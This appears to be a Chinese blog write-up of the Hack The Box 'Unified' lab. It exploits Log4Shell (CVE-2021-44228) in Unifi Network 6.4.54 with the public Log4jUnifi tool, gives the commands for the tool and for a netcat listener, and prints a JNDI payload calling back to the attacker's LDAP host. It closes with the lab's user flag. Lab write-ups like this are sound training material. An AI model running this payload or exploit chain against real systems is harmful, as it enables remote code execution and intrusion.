# 利用 CVE-2021-44228 漏洞获得 Unifi Network 的 Shell - Jason_huawen - 博客园

> 原文：[`www.cnblogs.com/jason-huawen/p/16072746.html`](https://www.cnblogs.com/jason-huawen/p/16072746.html)

目标：Hackthebox 的 Unified 实例

通过 nmap 工具扫描，可以获得该目标运行的端口以及服务，了解到该目标运行 web 应用，用 https:// 10.129.232.197:8443 访问得知，似乎是一个网络设备的管理页面，根据提示，该页面为 Unifi Network 设备管理页面，并且版本为：6.4.54。

利用搜索引擎查找根据 Unifi Network 6.4.54 版本相关的漏洞，得知该版本存在漏洞：CVE-2021-44228。后文即为利用该漏洞获得对目标的 shell 权限，并提取到 user flag。

第一步：根据下述步骤在 Kali Linux 安装 docker

#apt update

#curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add –

#echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' |
#sudo tee /etc/apt/sources.list.d/docker.list

#apt update

#apt remove docker docker-engine docker.io

#apt install docker-ce -y

#systemctl start docker

#systemctl enable docker

第二步：下载 CVE-2021-44228 漏洞利用 Docker 镜像

执行下述命令在 kali Linux 安装 JDK 以及 maven：

```
#apt update && apt install openjdk-11-jre maven
```

```
`#git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi && cd Log4jUnifi && pip3 install -r requirements.txt`
```

```
`#mvn package -f utils/rogue-jndi/`
```

下载并制作 Docker `Log4jUnifi``的`镜像:

```
`#git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jUnifi && cd Log4jUnifi && docker build -t log4junifi .`
```

此时在 Kali Linux 上用 openVPN 连接上 Hackthebox,启动 Unified 实例，然后在 kali Linux 用 nc 启动监听：

 # nc -nlvp 1234 -s 10.10.14.165

```
`#docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 log4junifi -u https://` `10.129.232.197:8443 -i 10.10.14.165 -p 1234`
```

输出：

{"username": "${jndi:ldap://10.10.14.165:1389/o=tomcat}", "password": "log4j", "remember": "${jndi:ldap://10.10.14.165:1389/o=tomcat}", "strict":true}

成功拿到 shell

并得到用户 flag:

6ced1a6a89e666c0620cdb10262ba127